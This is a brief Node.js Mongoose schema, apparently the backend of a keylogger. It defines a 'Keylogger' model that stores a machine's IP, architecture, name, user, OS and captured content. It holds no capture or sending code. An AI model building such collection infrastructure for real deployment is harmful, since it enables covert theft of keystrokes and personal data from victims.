const mongoose = require('mongoose');

const KeyloggerSchema = new mongoose.Schema({
  ip: {type: String, required: true},
  arquitectura: {type: String, required: true},
  nombre: {type: String, required: true},
  usuario: {type: String, required: true },
  so: {type: String, required: true},
  content: {type: String}
});

module.exports = mongoose.model('Keylogger', KeyloggerSchema);